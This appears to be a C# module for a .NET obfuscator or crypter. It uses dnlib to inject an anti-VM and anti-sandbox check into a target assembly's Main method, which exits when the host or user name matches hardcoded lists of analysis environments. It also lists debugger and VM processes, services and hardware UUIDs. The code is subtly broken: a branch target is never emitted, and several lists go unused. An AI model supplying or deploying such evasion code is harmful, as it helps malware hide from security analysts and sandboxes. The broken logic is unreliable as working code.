using System;
using System.Linq;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

public static class Antivm
{
    private static readonly string[] blacklistedPCNames = new string[]
    {
        "bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4",
        "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet",
        "server1", "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29",
        "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc",
        "desktop-wg3myjs", "desktop-7xc6gez", "desktop-5ov9s0o", "qarzhrdbpj",
        "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh", "nettypc", "desktop-bugio",
        "desktop-cbgpfee", "server-pc", "tiqiyla9tw5m", "desktop-kalvino", "compname_4047",
        "desktop-19olltd", "desktop-de369se", "ea8c2e2a-d017-4", "aidanpc", "lucas-pc",
        "marci-pc", "acepc", "mike-pc", "desktop-iapkn1p", "desktop-ntu7vuo", "louise-pc",
        "t00917", "test42", "desktop-et51ajo", "desktop-test", "sandbox", "winvm"
    };

    private static readonly string[] blacklistedUsers = new string[]
    {
        "wdagutilityaccount", "abby", "hmarc", "patex", "rdhj0cnfevzx", "keecfmwgj", "frank",
        "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a",
        "lmvwjj9b", "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl", "fred", "server",
        "bvjchrpnsxn", "harry johnson", "sqgfof3g", "lucas", "mike", "patex", "h7dk1xpr",
        "louise", "user01", "test", "rgzcbuyrznreg", "bruno", "administrator",
        "sandbox", "user", "sysadmin", "malware", "analyst", "debug"
    };

    private static readonly string[] blacklistedUUIDs = new string[]
    {
        "00000000-0000-0000-0000-000000000000", "11111111-2222-3333-4444-555555555555",
        "03000200-0400-0500-0006-000700080009", "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
        "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A",
        "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7",
        "49434D53-0200-9036-2500-369025000C65", "00000000-0000-0000-0000-AC1F6BD048FE",
        "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB",
        "FF577B79-782E-0A4D-8568-B35A9B7EB76B", "08C1E400-3C56-11EA-8000-3CECEF43FEDE",
        "00000000-0000-0000-0000-50E5493391EF", "BB64E044-87BA-C847-BC0A-C797D1A16A50",
        "3F284CA4-8BDF-489B-A273-41B44D668F6D", "A15A930C-8251-9645-AF63-E45AD728C20C",
        "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363"
    };

    private static readonly string[] blacklistedProcesses = new string[]
    {
        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe", "vboxservice.exe", "vboxtray.exe",
        "xenservice.exe", "qemu-ga.exe", "wireshark.exe", "processhacker.exe", "procexp.exe",
        "ida.exe", "ollydbg.exe", "x64dbg.exe", "fiddler.exe", "tcpview.exe", "vmacthlp.exe"
    };

    private static readonly string[] blacklistedServices = new string[]
    {
        "vmmouse", "vmhgfs", "vboxguest", "vboxmouse", "vboxservice", "vboxvideo",
        "vmvss", "vmx86", "vmware", "vmsrvc", "xenevtchn"
    };

    public static void Execute(ModuleDefMD module)
    {
        var main = module.Types.SelectMany(t => t.Methods).FirstOrDefault(m => m.Name == "Main" && m.HasBody);
        if (main == null)
            return;

        var checkMethod = new MethodDefUser("CheckBlacklisted",
            MethodSig.CreateStatic(module.CorLibTypes.Boolean),
            MethodImplAttributes.IL | MethodImplAttributes.Managed,
            MethodAttributes.Public | MethodAttributes.Static);
        checkMethod.Body = new CilBody();
        module.GlobalType.Methods.Add(checkMethod);

        var instrs = checkMethod.Body.Instructions;

        var envMachineName = module.Import(typeof(Environment).GetProperty("MachineName").GetGetMethod());
        var envUserName = module.Import(typeof(Environment).GetProperty("UserName").GetGetMethod());
        var envExit = module.Import(typeof(Environment).GetMethod("Exit", new Type[] { typeof(int) }));
        var stringEquals = module.Import(typeof(string).GetMethod("Equals", new Type[] { typeof(string), typeof(string), typeof(StringComparison) }));
        var stringComparisonOrdinalIgnoreCase = (int)StringComparison.OrdinalIgnoreCase;

        var localMachineName = new Local(module.CorLibTypes.String);
        var localUserName = new Local(module.CorLibTypes.String);
        checkMethod.Body.Variables.Add(localMachineName);
        checkMethod.Body.Variables.Add(localUserName);

        instrs.Add(Instruction.Create(OpCodes.Call, envMachineName));
        instrs.Add(Instruction.Create(OpCodes.Stloc, localMachineName));
        instrs.Add(Instruction.Create(OpCodes.Call, envUserName));
        instrs.Add(Instruction.Create(OpCodes.Stloc, localUserName));

        var retFalse = Instruction.Create(OpCodes.Ldc_I4_0);
        var retTrue = Instruction.Create(OpCodes.Ldc_I4_1);

        foreach (var pcName in blacklistedPCNames)
        {
            instrs.Add(Instruction.Create(OpCodes.Ldloc, localMachineName));
            instrs.Add(Instruction.Create(OpCodes.Ldstr, pcName));
            instrs.Add(Instruction.Create(OpCodes.Ldc_I4, stringComparisonOrdinalIgnoreCase));
            instrs.Add(Instruction.Create(OpCodes.Call, stringEquals));
            instrs.Add(Instruction.Create(OpCodes.Brtrue, retTrue));
        }

        foreach (var user in blacklistedUsers)
        {
            instrs.Add(Instruction.Create(OpCodes.Ldloc, localUserName));
            instrs.Add(Instruction.Create(OpCodes.Ldstr, user));
            instrs.Add(Instruction.Create(OpCodes.Ldc_I4, stringComparisonOrdinalIgnoreCase));
            instrs.Add(Instruction.Create(OpCodes.Call, stringEquals));
            instrs.Add(Instruction.Create(OpCodes.Brtrue, retTrue));
        }

        instrs.Add(retFalse);
        instrs.Add(Instruction.Create(OpCodes.Ret));

        var il = main.Body.Instructions;
        var firstInstr = il[0];

        il.Insert(0, Instruction.Create(OpCodes.Call, checkMethod));
        il.Insert(1, Instruction.Create(OpCodes.Brfalse_S, firstInstr));
        il.Insert(2, Instruction.Create(OpCodes.Ldc_I4_0));
        il.Insert(3, Instruction.Create(OpCodes.Call, envExit));
    }
}
